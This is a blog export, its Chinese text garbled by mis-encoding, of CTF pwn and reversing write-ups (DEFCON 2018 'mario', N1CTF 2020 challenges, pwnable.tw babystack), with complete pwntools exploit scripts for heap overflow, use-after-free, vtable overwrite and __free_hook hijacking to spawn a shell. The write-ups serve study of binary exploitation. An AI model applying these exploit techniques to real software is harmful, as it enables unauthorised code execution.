{"pages":[],"posts":[{"title":"DEFCON2018_Quals_mario","text":"DEFCON2018 mario ä¸€æ¬¡å‹‡æ•¢çš„å°è¯•ğŸ‘¼ é¢†æ•™äº†defconçš„éš¾åº¦ï¼Œæ€»ç»“äº†ä¸€ç‚¹éš¾é¢˜çš„è§„å¾‹ï¼š1.ä»£ç é‡å¤§2.æ•°æ®å¤æ‚3.æ¼æ´éšè”½4.åˆ©ç”¨å›°éš¾5.Cå’ŒC+æ··åˆ,ä¸”ç”¨vectorå¯¼è‡´å †å¾ˆçç¢ æˆ‘å…¨ç¨‹è·Ÿç€hxpçš„è„šæœ¬è¾¹è°ƒè¾¹åšä½†ä¹Ÿåªæ˜¯æ‡‚äº†å¤§æ¦‚80%ï¼Œæ˜ç™½äº†æ¼æ´æ‰€åœ¨ï¼Œæ˜ç™½äº†leakçš„æ–¹æ³•ï¼Œä½†æœ€åçš„æ‹¿shellå¾ˆğŸ˜µï¼Œhxpè¯´æ˜¯åˆ©ç”¨win_heap(æŒ‡å‘one_gadgetçš„heap)è¦†ç›–è¾“å‡ºpizza objectdçš„å‡½æ•°vtableï¼Œå†é€šè¿‡admireå‡½æ•°å®ç°æ‰§è¡Œï¼Œå¯èƒ½è¿˜æ˜¯æˆ‘ç»“æ„ä½“æˆ–è€…vectoråˆ†æçš„æœ‰é—®é¢˜å§ğŸ˜¥ æˆ‘å…ˆåˆ†æä¸€ä¸‹æ¼æ´æ‰€åœ¨ï¼š 12345printf(&quot;Before I start cooking your pizzas, do you have anything to declare? Please explain: &quot;); read_n_0((__int64)byte_20C480, 0x12C); v1 = strlen(byte_20C480); *(_QWORD *)(a1 + 32) = malloc(v1 + 1); strcpy(*(char **)(a1 + 32), byte_20C480); cookå‡½æ•°ä¼šè¦æ±‚æˆ‘ä»¬ç•™è¨€,å¹¶æ ¹æ®æˆ‘ä»¬è¾“å…¥çš„æ•°æ®é•¿åº¦æ¥mallocã€‚ ä½†å¦‚æœmarioç”Ÿæ°”çš„è¯ä¼šæœ‰ä¸€ä¸ªâ€™Pâ€™é€‰é¡¹ï¼š 123456789case 80: if ( v3 ) { printf(&quot;last chance, explain yourself: &quot;); read_n_0(is_user[4], 300); puts(&quot;too bad, no explanation is reasonable. BAM BAM BAM!&quot;); *((_BYTE *)is_user + 65) = 1; } break; read_nå‡½æ•°å‚æ•°ä¸ºä¸Šä¹°mallocçš„å †ï¼Œä½†å¯å†™300å­—èŠ‚ï¼Œé€ æˆå †æº¢å‡º è¿˜æœ‰ä¸€å¤„æ¼æ´åœ¨äºcookåé¢ï¼š 12345678910111213if ( v14 &amp; 0xF0 ){ if ( v14 &gt;&gt; 4 == (v13 &amp; 0xF) ) { puts(&quot;Molto bene, all cooked!&quot;); if ( !(v14 &amp; 0xF) ) free(*(void **)(a1 + 0x20)); } else { puts(&quot;found non-approved pizzas. come on.&quot;); }} å¦‚æœæœ‰1ä¸ªå¥½æŠ«è¨å’Œ0x10ä¸ªåæŠ«è¨åˆ™ä¼šæ‰§è¡Œfree(ä¸Šé¢mallocçš„)ï¼Œé€ æˆuafã€‚ æ¼æ´å¤§æ¦‚æ˜¯è¿™äº›ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•è®©marioç”Ÿæ°”äº†ã€‚ é¢˜ç›®å¾ˆæœ‰æ„æ€ï¼Œå¦‚æœå†orderæŠ«è¨çš„æ—¶å€™æ·»åŠ é…æ–™é‡Œæœ‰ğŸï¼Œåˆ™ä¼šæ˜¯åæŠ«è¨ï¼Œmarioä¼šç”Ÿæ°”ï¼Œå¹¶ç›´æ¥é€€å‡ºã€‚ å› æ­¤ä¸ºäº†åšåæŠ«è¨å¹¶ä¸é€€å‡ºï¼Œåˆ™å¯ä»¥é€šè¿‡ä¸¤ä¸ªutf8çš„æ‹¼æ¥æ¥å®ç°è èçš„è¾“å…¥ã€‚ æŒ‰ç…§ä¸Šé¢çš„1ä¸ªå¥½0x10ä¸ªåä½¿å¾—free,æ§åˆ¶å¤§å°è¿›å…¥unsorted binï¼Œuafç¬¬ä¸€æ¬¡å¯æ³„éœ²heapï¼Œç¬¬äºŒæ¬¡å¯æ³„éœ²libcï¼Œè‡ªå·±è°ƒä¸‹å°±æ˜ç™½äº†ã€‚ä¹‹åå°±åˆ°æ‡µé€¼ç¯èŠ‚äº†ã€‚ hxpå¤§ä½¬å…ˆnewä¹‹åcookçš„ç•™è¨€å†™äº†â€™vâ€™*4ä¸ªå­—èŠ‚ï¼Œç„¶åé€€å‡ºï¼Œä¹‹åç”¨å †æº¢å‡ºæ”¹å†™å‰é¢ä¸€ç›´åˆ©ç”¨çš„é‚£ä¸ªå †å—ä¸ºp64(win_addr)*2 + â€œXâ€*144 + p64(win_heap_addr)*2ï¼Œç„¶åæ‰§è¡Œadmireæ‹¿shellã€‚ exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110from pwn import *context.log_level='debug'context.arch='amd64'emojis = { 'pineapple': b&quot;\\xf0\\x9f\\x8d\\x8d&quot;, 'tomato': b&quot;\\xf0\\x9f\\x8d\\x85&quot; }def debug(addr,PIE=True): if PIE: text_base = int(os.popen(&quot;pmap {}| awk '{{print $1}}'&quot;.format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *{}'.format(hex(text_base+addr))) else: gdb.attach(p,&quot;b *{}&quot;.format(hex(addr)))def cust_new(name): p.recvuntil(&quot;Choice:&quot;) p.sendline(&quot;N&quot;) p.recvuntil(&quot;name?&quot;) p.sendline(name)def cust_login(name): p.recvuntil(&quot;Choice:&quot;) p.sendline(&quot;L&quot;) p.recvuntil(&quot;name?&quot;) p.sendline(name)def cook(explanation=''): p.recvuntil(&quot;Choice:&quot;) p.sendline(&quot;C&quot;) p.recvuntil(&quot;explain:&quot;) p.sendline(explanation) p.recvuntil(&quot;USER MENU&quot;)def order(items): p.recvuntil(&quot;Choice:&quot;) p.sendline(&quot;O&quot;) p.recvuntil(&quot;how many pizzas?&quot;) p.sendline(str(len(items))) for i in range(len(items)): p.recvuntil(&quot;how many ingredients?&quot;) p.sendline(str(len(items[i]))) for ing in items[i]: p.recvuntil(&quot;:&quot;) p.sendline(ing) log.info(&quot;pizza &quot; + str(i+1) + &quot;: adding &quot; + str(ing))def admire(): p.recvuntil(&quot;Choice:&quot;) p.sendline(&quot;A&quot;) p.recvline()def cust_logout(): p.recvuntil(&quot;Choice:&quot;) p.sendline(&quot;L&quot;)def overflow(payload): p.recvuntil(&quot;Choice:&quot;) p.sendline(&quot;P&quot;) p.recvuntil(&quot;explain yourself:&quot;) p.sendline(payload)def why_upset(): p.recvuntil(&quot;Choice:&quot;) p.sendline(&quot;W&quot;) # p.recvuntil(&quot;say: &quot;) # output = p.recvline()[:-1] # return repr(output)def main(host,port=1234): global p if host: p=remote(host,port) else: p=process(&quot;./mario&quot;) debug(0x0002E23) cust_new('1'*8) good_pizza = [emojis['tomato']] naughty_pizza = [emojis['tomato'] + emojis['pineapple'][:2] + emojis['pineapple'][:2], emojis['pineapple'][2:] + emojis['tomato']] payload=[] payload.append(good_pizza) for _ in range(16): payload.append(naughty_pizza) order(payload) cook('1'*0x104) cust_logout() why_upset() p.recvuntil(&quot;say: &quot;) heap_addr=u64(p.recv(6).ljust(8,'\\x00')) info(&quot;heap: &quot;+hex(heap_addr)) cust_new('2'*8) order([good_pizza]) cook('2'*0x104) cust_logout() why_upset() p.recvuntil(&quot;say: &quot;) libc.address=u64(p.recvuntil(&quot;\\x7f&quot;).ljust(8,'\\x00'))-0x6cdb78+0x309000 info(&quot;libc: &quot;+hex(libc.address)) win_addr=libc.address+0x4527a cust_login('2'*8) order([[emojis['tomato']]]) cook('v'*4) cust_logout() win_heap_addr=heap_addr - 3984 cust_login('1'*8) overflow(p64(win_addr)*2 + &quot;X&quot;*144 + p64(win_heap_addr)*2) cust_login(&quot;2&quot;*8) admire() # gdb.attach(p) p.interactive()if __name__ == &quot;__main__&quot;: libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;) main(0)æˆ‘é£˜äº†ï¼Œè¿defconçš„é¢˜éƒ½æ•¢çœ‹äº†ï¼Œä¸è¿‡è¿™æ ·ä¹Ÿå¥½ï¼Œè®©æˆ‘çœ‹æ¸…äº†è‡ªå·±çš„æ°´å¹³ï¼Œå¸Œæœ›è‡ªå·±èƒ½æœ‰ä¸€å¤©å†æ¬¡å›æ¥çœ‹è¿™é“é¢˜ç›®çš„æ—¶å€™ï¼Œèƒ½å¤Ÿä¸åƒç°åœ¨å¦‚æ­¤è‰°éš¾å§ã€‚ è¡¥å……ï¼Œå¦‚æ²¡æœ‰æœ€åä¸¤ä¸ªp64çš„è¦†ç›–ï¼Œåˆ™åœ¨æ‰§è¡Œcall raxæ˜¯å¯„å­˜å™¨ä½ï¼š 12345678910111213141516171819202122232425262728293031323334 RAX 0x55aea44fbcac â—‚â€” push rbp RBX 0x0 RCX 0x7ffd8bcbffa0 â—‚â€” 0x0 RDX 0x55aea59401d0 â€”â–¸ 0x55aea4705c00 â€”â–¸ 0x55aea44fbcac â—‚â€” push rbp RDI 0x55aea59401d0 â€”â–¸ 0x55aea4705c00 â€”â–¸ 0x55aea44fbcac â—‚â€” push rbp RSI 0x7ffd8bcbffa0 â—‚â€” 0x0 R8 0x7f3d93746740 â—‚â€” 0x7f3d93746740 R9 0x2020202020202020 (' ') R10 0x0 R11 0x246 R12 0x55aea44fb5f0 â—‚â€” xor ebp, ebp R13 0x7ffd8bcc19f0 â—‚â€” 0x1 R14 0x0 R15 0x0 RBP 0x7ffd8bcc18b0 â€”â–¸ 0x7ffd8bcc18d0 â€”â–¸ 0x7ffd8bcc18f0 â€”â–¸ 0x7ffd8bcc1910 â€”â–¸ 0x55aea45012f0 â—‚â€” ... RSP 0x7ffd8bcbff70 â—‚â€” 0x0 RIP 0x55aea44fd039 â—‚â€” call raxâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 0x55aea44fd022 mov rax, qword ptr [rax] 0x55aea44fd025 lea rcx, [rbp - 0x1910] 0x55aea44fd02c mov rdx, qword ptr [rbp - 0x1918] 0x55aea44fd033 mov rsi, rcx 0x55aea44fd036 mov rdi, rdx â–º 0x55aea44fd039 call raxpwndbg&gt; telescope 0x55aea5940130 4000:0000â”‚ 0x55aea5940130 â€”â–¸ 0x7f3d92c2327a (do_system+1098) â—‚â€” mov rax, qword ptr [rip + 0x37ec37]... â†“02:0010â”‚ 0x55aea5940140 â—‚â€” 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'... â†“14:00a0â”‚ rdx rdi 0x55aea59401d0 â€”â–¸ 0x55aea4705c00 â€”â–¸ 0x55aea44fbcac â—‚â€” push rbp15:00a8â”‚ 0x55aea59401d8 â€”â–¸ 0x55aea5940210 â—‚â€” 0x7f00858d9ff0 å¯ä»¥çœ‹åˆ°ï¼Œæ‹¿shellçš„å…³é”®æ˜¯åœ¨heap_overflowçš„æ—¶å€™æ”¹æ‰ä½äº0x55aea59401d0 â€”â–¸ 0x55aea4705c00 â€”â–¸ 0x55aea44fbcac â—‚â€” push rbpçš„vtablï¼ˆæ”¹æˆwin_heap_addrï¼Œ0x55aea44fbcacæœ¬æ¥æ˜¯è¦æ‰“å°pizza_objectçš„ï¼‰ä»è€Œåœ¨call raxæ—¶å€™å®ç°get shell!!! åŸºæœ¬æ˜ç™½è¿™é¢˜çš„æ€è·¯äº†ï¼Œæœ€åæ‹¿shellçš„æ¼æ´æ˜æ˜¾ä¸“é—¨è®¾è®¡çš„ï¼Œç•¥æ˜¾ç”Ÿç¡¬ğŸš©","link":"/2020/10/12/DEFCON18_Quals_mario/"},{"title":"N1CTF2020","text":"N1CTF Pwn&amp;Reéƒ¨åˆ† æ‹–äº†å¥½ä¹…çš„wpï¼Œå·®ç‚¹å’•å’•å’•äº†â° siginè¿™é¢˜æˆ‘å¼€å§‹çš„æ€è·¯é”™äº†ï¼Œå…ˆå»åŠ«æŒtecache_structæ³„éœ²ï¼Œä¹‹åæ‰“free_hookçš„æ—¶å€™ä¹Ÿæ˜¯æ”¹çš„tecache_structï¼Œç”±äºtecache_structå’Œæˆ‘ä»¬ç”³è¯·çš„heapä¹‹é—´è¿˜æœ‰ä¸€ä¸ª0x1010çš„å †ï¼Œå¯¼è‡´åé¢å†å»è°ƒæ•´curæŒ‡é’ˆæ—¶ç–¯ç‹‚å¾ªç¯deleå¤§æ¦‚0x2000å¤šæ¬¡ğŸ¤¦ï¼Œæœ¬åœ°é€šäº†ï¼Œè¿œç¨‹GGï¼Œæ‰€ä»¥åé¢æ¢äº†ç§è§£æ³•0.0 å…ˆåˆ†æç¨‹åºé€»è¾‘ï¼ŒC++å†™çš„èœå•é¢˜ï¼Œä½¿ç”¨äº†vectoræ¥å­˜å‚¨æˆ‘ä»¬çš„æ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥æ‹¥æœ‰ä¸¤ä¸ªvectorã€‚ æ•°æ®ç»“æ„ä¸ºï¼š 12345struct con{ void *begin; void *cur; void *end;} å½“cur==endæ—¶vectorä¼šè¿›è¡Œæ‰©å®¹çš„æ“ä½œï¼Œå…ˆç”³è¯·ä¸€ä¸ªæ›´å¤§çš„å †ï¼Œä¹‹åå°†æ•°æ®copyè¿‡å»ï¼Œå†å°†æ—§å †freeã€‚æ‰©å®¹å¤§å°ä¾æ¬¡ä¸º0x20,0x20,0x30,0x50,0x90,0x110,0x210,0x410,0x810,0x1010(å°±å †çš„å¤§å°è€Œè¨€) æ¼æ´åœ¨äºdeleæ—¶åªæ˜¯å°†curæŒ‡é’ˆå‡å°8ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡deleæ§åˆ¶curæŒ‡é’ˆï¼Œé…åˆaddå¯ä»»æ„åœ°å€å†™ã€‚ åˆ©ç”¨æ€è·¯ï¼š1.é€šè¿‡ä¸æ–­addä½¿å¾—æ‰©å®¹freeçš„å †æ”¾å…¥unsorted bin2.deleæ§åˆ¶curæŒ‡å‘unsortedbin-&gt;fdçš„åœ°å€ï¼Œé…åˆshowæ³„éœ²ã€‚3.ä¹‹ååˆ©ç”¨vecortæ‰©å®¹çš„è§„å¾‹0x20,0x20ï¼Œå…ˆå°†åœ¨tecacheçš„0x20ä½ç½®çš„ç¬¬ä¸€ä¸ªbin1-&gt;fdå†™å¦‚__free_hook-8ï¼Œä¹‹åvector2å…ˆæ‹¿å‡ºbin1ã€‚è¿™é‡Œå†™å…¥str(0x68732f6e69622f)(å³â€™/bin/shâ€™)ï¼Œä¹‹åadd(2,str(libc.sym['system'])),ç”±äºæ‰©å®¹ä»è€Œåœ¨free_hook-8å†™å…¥â€™/bin/shâ€™åŒæ—¶åŠ«æŒfree_hookä¸ºsystemã€‚ expï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596from pwn import *context.log_level='debug'context.arch='amd64'def cmd(command): p.recvuntil(&quot;&gt;&gt;&quot;) p.sendline(str(command))def add(idx,number): cmd(1) p.recvuntil(&quot;:&quot;) p.sendline(str(idx)) p.recvuntil(&quot;:&quot;) p.sendline(number)def dele(idx): cmd(2) p.recvuntil(&quot;:&quot;) p.sendline(str(idx))def show(idx): cmd(3) p.recvuntil(&quot;:&quot;) p.sendline(str(idx))def main(host,port=9990): global p if host: p=remote(host,port) else: p=process(&quot;./signin&quot;,env={&quot;LD_PRELOAD&quot;:&quot;/home/an9ela/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc-2.27.so&quot;}) for i in range(258): add(1,'1') for i in range(0x206-3): dele(1) show(1) offset=0x3ebca0 libc.address=int(p.recvuntil(&quot;\\n&quot;))-offset success(&quot;libc: &quot;+hex(libc.address)) for i in range(0x00010d): dele(1) add(1,str(libc.sym['__free_hook']-8)) add(2,str(0x68732f6e69622f)) add(2,str(libc.sym['system'])) # add(1,'1234') # add(1,'1000') # # add(1,'1234') # add(1,'2222') # for i in range(6): # dele(1) # show(1) # heap_addr=int(p.recvuntil(&quot;\\n&quot;)) # success(&quot;heap: &quot;+hex(heap_addr)) # dele(1) # add(1,str(heap_addr-0x011e60)) # add(2,'18446744073709551615') # add(2,'18446744073709551615') # for i in range(31): # add(2,'1') # for i in range(0x220/8-2): # dele(2) # show(2) # offset=0x3ebca0 # libc.address=int(p.recvuntil(&quot;\\n&quot;))-offset # success(&quot;libc: &quot;+hex(libc.address)) # for i in range(0x0023ee+4): # dele(2) # print&quot;times:&quot;+str(i) # add(2,str(libc.sym['__free_hook']-8)) # # add(1,'0') # add(1,'0') # add(1,str(0x31)) # one=0x4f3c2 # realloc_hook=libc.symbols['__libc_realloc'] # # binsh=0x68732f6e69622f # add(1,str(binsh)) # add(1,str(libc.sym['system'])) # for i in range(3): # add(1,'0') #æ³¨é‡Šçš„æ˜¯ç¬¬ä¸€ç§è§£æ³•ã€‚ # gdb.attach(p) p.interactive()if __name__ == '__main__': libc=ELF(&quot;./libc.so&quot;) main(&quot;47.242.161.199&quot;) # main(0) easywriteè¿™é¢˜å­¦åˆ°æ–°å§¿åŠ¿äº†ï¼Œruanå¸ˆå‚…å‡ åˆ†é’Ÿæ‰“é€štqlã€‚ ç¨‹åºé€»è¾‘å¾ˆç®€å•ï¼Œç»™äº†æˆ‘ä»¬libcåœ°å€ï¼Œæœ‰ä¸€æ¬¡å¾€ä»»æ„åœ°å€å†™å…¥heapåœ°å€çš„æœºä¼šï¼Œè€Œä¸”heapçš„å†…å®¹å¯æ§ï¼Œä¹‹åç¨‹åºä¼šç”³è¯·0x30çš„å †å­˜æ”¾ç•™è¨€ï¼Œå¹¶åœ¨é€€å‡ºæ—¶freeã€‚ ç”±äºæœ€åçš„è¿™ä¸ª0x30çš„å †malloc/freeæ“ä½œå¾ˆå¯ç–‘ï¼Œæœ€ååº”è¯¥å°±æ˜¯è¦åŠ«æŒfree_hookï¼Œä½¿å¾—åœ¨freeæ—¶è§¦å‘ã€‚ æ²¡æƒ³åˆ°ä¸Šé¢˜æ²¡ç”¨åˆ°tecache_structï¼Œè€Œè¿™é¢˜ç”¨åˆ°äº†ã€‚libcä¸­æœ‰ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘tacache_structï¼Œç¨‹åºä¹Ÿæ˜¯é€šè¿‡è¿™ä¸ªæŒ‡é’ˆæ‰¾åˆ°tecache_structçš„ä½ç½®çš„ã€‚ å› æ­¤æˆ‘ä»¬åªè¦å°†è¿™ä¸ªæŒ‡é’ˆæŒ‡å‘å†…å®¹å¯æ§çš„heapï¼Œå°±èƒ½ä¼ªé€ tecache_structï¼Œå¹¶ä¸”åœ¨å‡structä¸­å¯¹åº”0x40å¤§å°binçš„ä½ç½®å†™å…¥free_hookï¼Œé‚£æ¥ä¸‹æ¥çš„malloc(0x30)å°±ä¼šæ‹¿åˆ°free_hookï¼Œè¿›è€ŒåŠ«æŒfree_hook:) expï¼š 12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *context.log_level='debug'context.arch='amd64'def debug(addr,PIE=True): if PIE: text_base = int(os.popen(&quot;pmap {}| awk '{{print $1}}'&quot;.format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *{}'.format(hex(text_base+addr))) else: gdb.attach(p,&quot;b *{}&quot;.format(hex(addr)))def main(host,port=1234): global p if host: p=remote(host,port) else: p=process(&quot;./easywrite&quot;) one=0xe6ce3 debug(0x12BA) p.recvuntil(&quot;Here is your gift:&quot;) libc.address=int(p.recv(14),16) success(&quot;libc: &quot;+hex(libc.address)) p.recvuntil(&quot;Input your message:&quot;) payload = p64(0x100000000) payload = payload.ljust(0x90,b&quot;\\x00&quot;) payload += p64(libc.address+0x15fed8-0x10) p.send(payload) p.recvuntil(&quot;Where to write?:&quot;) p.send(p64(libc.address+0x1648a0)) p.recvuntil(&quot;Any last message?:&quot;) p.send(b&quot;/bin/sh\\x00&quot;+p64(0)+p64(libc.address-0x39840)) # gdb.attach(p) p.interactive()if __name__ == &quot;__main__&quot;: libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;) main(0) Ofloè¿™é¢˜é€†å‘å¾ˆæœ‰æ„æ€ğŸ¤³ å…ˆæ‰§è¡Œä¸€ä¸‹å‘ç°è¾“å‡ºäº†linuxç‰ˆæœ¬å¹¶è¦æ±‚è¾“å…¥ã€‚ IDAæ‰“å¼€å‘å…ˆmainå‡½æ•°æœ‰èŠ±æŒ‡ä»¤ï¼Œå…ˆå»èŠ±ï¼Œä¹‹åé…åˆåŠ¨æ€è°ƒè¯•å‘ç°ç¨‹åºåœ¨main_0æœ‰ptraceå‡½æ•°æ£€æŸ¥è°ƒè¯•å™¨ï¼Œå› æ­¤ä¸èƒ½ç›´æ¥gdbï¼Œå¾—attachä¸Šå»è°ƒã€‚ 12#ps -aux | grep oflo è·å¾—è¿›ç¨‹å·#sudo gdb attach pid attach pid è¿™æ ·å°±å¯ä»¥äº†ï¼ŒåŠ¨æ€è°ƒçš„è¿‡ç¨‹ä¸­å‘ç°ç¨‹åºä¼šå°†æˆ‘ä»¬çš„è¾“å…¥çš„å‰5ä½å’Œ0x0400A6å¤„çš„æ“ä½œç xor,ä»è€Œä¸æ–­çš„ä¿®æ­£è¯¥å¤„çš„æ“ä½œç ï¼ˆ10æ¬¡ï¼‰ 123456789.text:0000000000400A69 byte_400A69 db 3Bh, 79h, 0EAh, 91h, 2Eh, 0EDh, 0DDh ;æ˜¯åæ‰çš„æ”¹ä¹‹å‰pwndbg&gt; telescope 0x400a6900:0000â”‚ rsi 0x400a69 â—‚â€” cmp edi, dword ptr [rcx - 0x16] /* 0x23dded2e91ea793b */æ”¹ä¹‹åpwndbg&gt; telescope 0x400a6900:0000â”‚ 0x400a69 â—‚â€” push rbp /* 0x40ec8348e5894855 */ ä¹‹åç¨‹åºä¼šcall 0x400a69ï¼Œå¦‚è¿‡ä¿®æ­£çš„ä¸å¯¹çš„è¯ç¨‹åºå°±æŠ¥é”™äº†ï¼Œè€Œæˆ‘ä»¬å‘ç°ä½¿ç”¨çš„åªæ˜¯æˆ‘ä»¬è¾“å…¥çš„å‰5ä¸ªå¦‚æœæ˜¯flagçš„è¯é‚£å°±æ˜¯n1ctfï¼Œç»“æœæŠŠ0x400a69ä¿®æ­£ä½push rbpï¼Œæ˜¾ç„¶æ˜¯æ­£ç¡®çš„ã€‚ è¿›å…¥è¯¥å‡½æ•°åå°±æ˜¯æ ¸å¿ƒçš„é€»è¾‘çš„ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼š 1234567891011121314 0x400a88 mov byte ptr [rbp - 0x20], 0x35 0x400a8c mov byte ptr [rbp - 0x1f], 0x2d 0x400a90 mov byte ptr [rbp - 0x1e], 0x11 0x400a94 mov byte ptr [rbp - 0x1d], 0x1aâ–º 0x400a98 mov byte ptr [rbp - 0x1c], 0x49 0x400a9c mov byte ptr [rbp - 0x1b], 0x7d 0x400aa0 mov byte ptr [rbp - 0x1a], 0x11 0x400aa4 mov byte ptr [rbp - 0x19], 0x14 0x400aa8 mov byte ptr [rbp - 0x18], 0x2b 0x400aac mov byte ptr [rbp - 0x17], 0x3b 0x400ab0 mov byte ptr [rbp - 0x16], 0x3e 0x400ab4 mov byte ptr [rbp - 0x15], 0x3d 0x400ab8 mov byte ptr [rbp - 0x14], 0x3c 0x400abc mov byte ptr [rbp - 0x13], 0x5f æ˜¾ç„¶æ˜¯ç”¨æ¥è¿ç®—çš„æ•°æ®ï¼Œé‚£ä¹ˆå’Œè°è¿›è¡Œè¿ç®—å‘¢ï¼Ÿ å¾€ä¸‹è°ƒå‘ç°ï¼š 12345678910111213141516171819202122232425262728 RAX 0x35 RBX 0x0 RCX 0x7ffc117e8ee0 â—‚â€” 'Linux version 5.4.0-52-generic (buildd@lcy01-amd64-022) (gcc version 7.5.0 (Ubuntu 7' RDX 0x7b RDI 0x7ffc117e8ee0 â—‚â€” 'Linux version 5.4.0-52-generic (buildd@lcy01-amd64-022) (gcc version 7.5.0 (Ubuntu 7' RSI 0x0 R8 0x17 R9 0x7f2f29996d80 (initial) â—‚â€” 0x0 R10 0x0 R11 0x206 R12 0x4005c0 â—‚â€” xor ebp, ebp /* 0x89485ed18949ed31 */ R13 0x7ffc117e91d0 â—‚â€” 0x1 R14 0x0 R15 0x0 RBP 0x7ffc117e8ea0 â€”â–¸ 0x7ffc117e90f0 â€”â–¸ 0x400d30 â—‚â€” push r15 /* 0x41ff894156415741 */ RSP 0x7ffc117e8e60 â€”â–¸ 0x7ffc117e8ec5 â—‚â€” '{aaaaa}\\n'*RIP 0x400aff â—‚â€” movzx ecx, byte ptr [rcx] /* 0xc183c9be0f09b60f */â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 0x400aef movsx edx, dl 0x400af2 mov ecx, dword ptr [rbp - 0x24] 0x400af5 movsxd rsi, ecx 0x400af8 mov rcx, qword ptr [rbp - 0x38] 0x400afc add rcx, rsi â–º 0x400aff movzx ecx, byte ptr [rcx] 0x400b02 movsx ecx, cl 0x400b05 add ecx, 2 0x400b08 xor edx, ecx 0x400b0a cmp eax, edx å¤šå¾ªç¯å‡ æ¬¡å°±ä¼šå‘ç°æ˜¯å’Œâ€™Linux version â€˜å„ä¸ªå­—ç¬¦çš„ord()+2è¿›è¡Œxorï¼Œè¿›è€Œå†™å‡ºè„šæœ¬ï¼š 1234567data=[0x35,0x2d,0x11,0x1a,0x49,0x7d,0x11,0x14,0x2b,0x3b,0x3e,0x3d,0x3c,0x5f]code='Linux version 'code=list(code)flag='n1ctf'for i in range(len(code)): flag+=chr((ord(code[i])+2)^(data[i]))print(flag) å‰é¢ä¿®æ­£æœºå™¨ç çš„éƒ¨åˆ†è°ƒäº†å¥½ä¹…æ‰æ˜ç™½ğŸ›Œ","link":"/2020/10/28/N1CTF2020/"},{"title":"Pwnable.tw babystack","text":"Pwnable.tw babystack è¿œç¨‹ææˆ‘å¿ƒæ€ğŸ¤¬ï¼Œæ”¶å‘æ”¹äº†åŠå¤©ï¼Œä½†æ¼æ´ç‚¹è¿˜æ˜¯æŒºç»†èŠ‚çš„ã€‚ ç¨‹å¼ä¸€å¼€å§‹å…ˆç”Ÿæˆé•¿åº¦0x10çš„éšæœºæ•°å¹¶æ”¾åœ¨rbp-0x20çš„ä½ç½®ï¼Œå¹¶åœ¨bssä¸Šå¤‡ä»½ã€‚ä¹‹åæ˜¯èœå•é€‰é¡¹ï¼š 1æ˜¯loginè¦æ±‚æˆ‘ä»¬è¾“å…¥passwordå¹¶æ ¹æ®æˆ‘ä»¬è¾“å…¥çš„passwordçš„é•¿åº¦æ¥å’Œæ ˆä¸­ç›¸åº”ä½ç½®è¿›è¡Œæ¯”è¾ƒã€‚ 12345678910111213int __fastcall login(const char *a1){ size_t v1; // rax char s; // [rsp+10h] [rbp-80h] printf(&quot;Your passowrd :&quot;); read_n((unsigned __int8 *)&amp;s, 0x7Fu); v1 = strlen(&amp;s); if ( strncmp(&amp;s, a1, v1) ) return puts(&quot;Failed !&quot;); flag = 1; return puts(&quot;Login Success !&quot;);} è¿™é‡Œæœ‰2ä¸ªæƒ³æ³•ï¼š1.å¯ä»¥é€šè¿‡strncmpä¾æ¬¡æ¯”è¾ƒæ¥çˆ†ç ´å‡ºpasswordã€‚2.strncmp(&amp;s, a1, v1)ï¼Œ&amp;sæ˜¯æˆ‘ä»¬çš„è¾“å…¥ï¼Œåœ¨ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå¯é€šè¿‡è¾“å…¥â€™\\x00â€™ç›´æ¥ä½¿å…¶è¿”å›ä¸º0ï¼ŒloginæˆåŠŸã€‚ loginä¹‹åæˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œ2çš„copyæ“ä½œï¼š 123456789int __fastcall sub_E76(char *a1){ char src; // [rsp+10h] [rbp-80h] printf(&quot;Copy :&quot;); read_n((unsigned __int8 *)&amp;src, 0x3Fu); strcpy(a1, &amp;src); return puts(&quot;It is magic copy !&quot;);} ä¸ºå•¥æ˜¯magic copy?é™¤äº†strcpyæœ‰ç‚¹å¯ç–‘ï¼Œä½†ä¹Ÿæ²¡æ˜æ˜¾çš„æ¼æ´ã€‚ çœ‹äº†ä¸€éä¸‹æ¥é™¤äº†çˆ†ç ´å‡ºpasswordå¤–æ²¡å•¥æƒ³æ³•äº†ğŸ¤¦ 